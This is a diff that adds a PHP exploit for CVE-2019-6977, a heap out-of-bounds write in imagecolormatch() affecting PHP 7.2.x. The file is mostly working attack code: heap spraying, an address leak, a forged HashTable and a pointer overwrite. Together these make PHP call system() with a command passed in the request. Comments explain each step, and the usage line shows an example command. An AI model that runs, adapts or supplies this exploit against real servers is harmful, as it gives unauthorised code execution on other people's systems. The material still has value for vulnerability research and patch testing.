@@ -1,0 +1,343 @@
+<?php
+# imagecolormatch() OOB Heap Write exploit
+# https://bugs.php.net/bug.php?id=77270
+# CVE-2019-6977
+# Charles Fol
+# @cfreal_
+#
+# Usage: GET/POST /exploit.php?f=<system_addr>&c=<command>
+# Example: GET/POST /exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi
+#
+# Target: PHP 7.2.x
+# Tested on: PHP 7.2.12
+#
+
+/*
+
+buf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);
+
+	for (x=0; x<im1->sx; x++) {
+		for( y=0; y<im1->sy; y++ ) {
+			color = im2->pixels[y][x];
+			rgb = im1->tpixels[y][x];
+			bp = buf + (color * 5);
+			(*(bp++))++;
+			*(bp++) += gdTrueColorGetRed(rgb);
+			*(bp++) += gdTrueColorGetGreen(rgb);
+			*(bp++) += gdTrueColorGetBlue(rgb);
+			*(bp++) += gdTrueColorGetAlpha(rgb);
+		}
+
+The buffer is written to by means of a color being the index:
+color = im2->pixels[y][x];
+..
+bp = buf + (color * 5);
+
+*/
+
+#
+# The bug allows us to increment 5 longs located after buf in memory.
+# The first long is incremented by one, others by an arbitrary value between 0
+# and 0xff.
+#
+
+error_reporting(E_ALL);
+define('OFFSET_STR_VAL', 0x18);
+define('BYTES_PER_COLOR', 0x28);
+
+
+class Nenuphar extends DOMNode
+{
+	# Add a property so that std.properties is created
+	function __construct()
+	{
+		$this->x = '1';
+	}
+
+	# Define __get
+	# => ce->ce_flags & ZEND_ACC_USE_GUARDS == ZEND_ACC_USE_GUARDS
+	# => zend_object_properties_size() == 0
+	# => sizeof(intern) == 0x50
+	function __get($x)
+	{
+		return $this->$x;
+	}
+}
+
+class Nenuphar2 extends DOMNode
+{
+	function __construct()
+	{
+		$this->x = '2';
+	}
+
+	function __get($x)
+	{
+		return $this->$x;
+	}
+}
+
+function ptr2str($ptr, $m=8)
+{
+	$out = "";
+    for ($i=0; $i<$m; $i++)
+    {
+        $out .= chr($ptr & 0xff);
+        $ptr >>= 8;
+    }
+    return $out;
+}
+
+function str2ptr(&$str, $p, $s=8)
+{
+	$address = 0;
+	for($j=$p+$s-1;$j>=$p;$j--)
+	{
+		$address <<= 8;
+		$address |= ord($str[$j]);
+	}
+	return $address;
+}
+
+# Spray stuff so that we get concurrent memory blocks
+for($i=0;$i<100;$i++)
+	${'spray'.$i} = str_repeat(chr($i), 2 * BYTES_PER_COLOR - OFFSET_STR_VAL);
+for($i=0;$i<100;$i++)
+	${'sprayx'.$i} = str_repeat(chr($i), 12 * BYTES_PER_COLOR - OFFSET_STR_VAL);
+
+#
+# #1: Address leak
+# We want to obtain the address of a string so that we can make
+# the Nenuphar.std.properties HashTable* point to it and hence control its
+# structure.
+#
+
+# We create two images $img1 and $img2, both of 1 pixel.
+# The RGB bytes of the pixel of $img1 will be added to OOB memory because we set
+# $img2 to have $nb_colors images and we set its only pixel to color number
+# $nb_colors.
+#
+$nb_colors = 12;
+$size_buf = $nb_colors * BYTES_PER_COLOR;
+
+# One pixel image so that the double loop iterates only once
+$img1 = imagecreatetruecolor(1, 1);
+
+# The three RGB values will be added to OOB memory
+# First value (Red) is added to the size of the zend_string structure which
+# lays under buf in memory.
+$color = imagecolorallocate($img1, 0xFF, 0, 0);
+imagefill($img1, 0, 0, $color);
+
+$img2 = imagecreate(1, 1);
+
+# Allocate $nb_colors colors: |buf| = $nb_colors * BYTES_PER_COLOR = 0x1e0
+# which puts buf in 0x200 memory blocks
+for($i=0;$i<$nb_colors;$i++)
+	imagecolorallocate($img2, 0, 0, $i);
+
+imagesetpixel($img2, 0, 0, $nb_colors + 1);
+
+# Create a memory layout as such:
+# [z:   zend_string: 0x200]
+# [x:   zend_string: 0x200]
+# [y:   zend_string: 0x200]
+$z = str_repeat('Z', $size_buf - OFFSET_STR_VAL);
+$x = str_repeat('X', $size_buf - OFFSET_STR_VAL);
+$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL);
+
+# Then, we unset z and call imagecolormatch(); buf will be at z's memory
+# location during the execution
+# [buf: long[]     : 0x200]
+# [x:   zend_string: 0x200]
+# [y:   zend_string: 0x200]
+#
+# We can write buf + 0x208 + (0x08 or 0x10 or 0x18)
+# buf + 0x208 + 0x08 is X's zend_string.len
+unset($z);
+imagecolormatch($img1, $img2);
+
+# Now, $x's size has been increased by 0xFF, so we can read further in memory.
+#
+# Since buf was the last freed block, by unsetting y, we make its first 8 bytes
+# point to the old memory location of buf
+# [free:             0x200] <-+
+# [x:   zend_string: 0x200]   |
+# [free:             0x200] --+
+unset($y);
+# We can read those bytes because x's size has been increased
+$z_address = str2ptr($x, 488) + OFFSET_STR_VAL;
+
+# Reset both these variables so that their slot cannot be "stolen" by other
+# allocations
+$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);
+
+# Now that we have z's address, we can make something point to it.
+# We create a fake HashTable structure in Z; when the script exits, each element
+# of this HashTable will be destroyed by calling ht->pDestructor(element)
+# The only element here is a string: "id"
+$z = 
+	# refcount
+	ptr2str(1) .
+	# u-nTableMask meth
+	ptr2str(0) .
+	# Bucket arData
+	ptr2str($z_address + 0x38) .
+	# uint32_t nNumUsed;
+	ptr2str(1, 4) .
+    # uint32_t nNumOfElements;
+	ptr2str(1, 4) .
+	# uint32_t nTableSize
+	ptr2str(0, 4) .
+	# uint32_t nInternalPointer
+	ptr2str(0, 4) .
+	# zend_long nNextFreeElement
+	ptr2str(0x4242424242424242) .
+	# dtor_func_t pDestructor
+	ptr2str(hexdec($_REQUEST['f'])) .
+	str_pad($_REQUEST['c'], 0x100, "\x00") .
+	ptr2str(0, strlen($y) - 0x38 - 0x100);
+;
+
+# At this point we control a string $z and we know its address: we'll make an
+# internal PHP HashTable structure point to it.
+
+
+#
+# #2: Read Nenuphar.std.properties
+#
+
+# The tricky part here was to find an interesting PHP structure that is
+# allocated in the same fastbins as buf, so that we can modify one of its
+# internal pointers. Since buf has to be a multiple of 0x28, I used dom_object,
+# whose size is 0x50 = 0x28 * 2. Nenuphar is a subclass of dom_object with just
+# one extra method, __get().
+# php_dom.c:1074: dom_object *intern = ecalloc(1, sizeof(dom_object) + zend_object_properties_size(class_type));
+# Since we defined a __get() method, zend_object_properties_size(class_type) = 0
+# and not -0x10.
+#
+# zend_object.properties points to an HashTable. Controlling an HashTable in PHP
+# means code execution since at the end of the script, every element of an HT is
+# destroyed by calling ht.pDestructor(ht.arData[i]).
+# Hence, we want to change the $nenuphar.std.properties pointer.
+#
+# To proceed, we first read $nenuphar.std.properties, and then increment it
+# by triggering the bug several times, until
+# $nenuphar.std.properties == $z_address
+#
+# Sadly, $nenuphar.std.ce will also get incremented by one every time we trigger
+# the bug. This is due to (*(bp++))++ (in gdImageColorMatch).
+# To circumvent this problem, we create two classes, Nenuphar and Nenuphar2, and
+# instanciate them as $nenuphar and $nenuphar2. After we're done changing the
+# std.properties pointer, we trigger the bug more times, until
+# $nenuphar.std.ce == $nenuphar2.std.ce2
+#
+# This way, $nenuphar will have an arbitrary std.properties pointer, and its
+# std.ce will be valid.
+#
+# Afterwards, we let the script exit, which will destroy our fake hashtable (Z),
+# and therefore call our arbitrary function.
+#
+
+# Here we want fastbins of size 0x50 to match dom_object's size
+$nb_colors = 2;
+$size_buf = $nb_colors * BYTES_PER_COLOR;
+
+$img1 = imagecreatetruecolor(1, 1);
+# The three RGB values will be added to OOB memory
+# Second value (Green) is added to the size of the zend_string structure which
+# lays under buf in memory.
+$color = imagecolorallocate($img1, 0, 0xFF, 0);
+imagefill($img1, 0, 0, $color);
+
+# Allocate 2 colors so that |buf| = 2 * 0x28 = 0x50
+$img2 = imagecreate(1, 1);
+for($i=0;$i<$nb_colors;$i++)
+	imagecolorallocate($img2, 0, 0, $i);
+
+$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);
+$x = str_repeat('X', $size_buf - OFFSET_STR_VAL - 8);
+$nenuphar = new Nenuphar();
+$nenuphar2 = new Nenuphar2();
+
+imagesetpixel($img2, 0, 0, $nb_colors);
+
+# Unsetting the first string so that buf takes its place
+unset($y);
+
+# Trigger the bug: $x's size is increased by 0xFF
+imagecolormatch($img1, $img2);
+
+$ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);
+$ce2_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + $size_buf + 0x28);
+$props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);
+
+print('Nenuphar.ce: 0x' . dechex($ce1_address) . "\n");
+print('Nenuphar2.ce: 0x' . dechex($ce2_address) . "\n");
+print('Nenuphar.properties: 0x' . dechex($props_address) . "\n");
+print('z.val: 0x' . dechex($z_address) . "\n");
+print('Difference: 0x' . dechex($z_address-$props_address) . "\n");
+
+if(
+	$ce2_address - $ce1_address < ($z_address-$props_address) / 0xff ||
+	$z_address - $props_address < 0
+)
+{
+	print('That won\'t work');
+	exit(0);
+}
+
+
+#
+# #3: Modifying Nenuphar.std.properties and Nenuphar.std.ce
+#
+
+# Each time we increment Nenuphar.properties by an arbitrary value, ce1_address
+# is also incremented by one because of (*(bp++))++;
+# Therefore after we're done incrementing props_address to z_address we need
+# to increment ce1's address one by one until Nenuphar1.ce == Nenuphar2.ce
+
+# The memory structure we have ATM is OK. We can just trigger the bug again
+# until Nenuphar.properties == z_address
+
+$color = imagecolorallocate($img1, 0, 0xFF, 0);
+imagefill($img1, 0, 0, $color);
+imagesetpixel($img2, 0, 0, $nb_colors + 3);
+
+for($current=$props_address+0xFF;$current<=$z_address;$current+=0xFF)
+{
+	imagecolormatch($img1, $img2);
+	$ce1_address++;
+}
+
+$color = imagecolorallocate($img1, 0, $z_address-$current+0xff, 0);
+imagefill($img1, 0, 0, $color);
+$current = imagecolormatch($img1, $img2);
+$ce1_address++;
+
+# Since we don't want to touch other values, only increase the first one, we set
+# the three colors to 0
+$color = imagecolorallocate($img1, 0, 0, 0);
+imagefill($img1, 0, 0, $color);
+
+# Trigger the bug once to increment ce1 by one.
+while($ce1_address++ < $ce2_address)
+{
+	imagecolormatch($img1, $img2);
+}
+
+# Read the string again to see if we were successful
+
+$new_ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);
+$new_props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);
+
+if($new_ce1_address == $ce2_address && $new_props_address == $z_address)
+{
+	print("\nExploit SUCCESSFUL !\n");
+}
+else
+{
+	print('NEW Nenuphar.ce: 0x' . dechex($new_ce1_address) . "\n");
+	print('NEW Nenuphar.std.properties: 0x' . dechex($new_props_address) . "\n");
+	print("\nExploit FAILED !\n");
+}
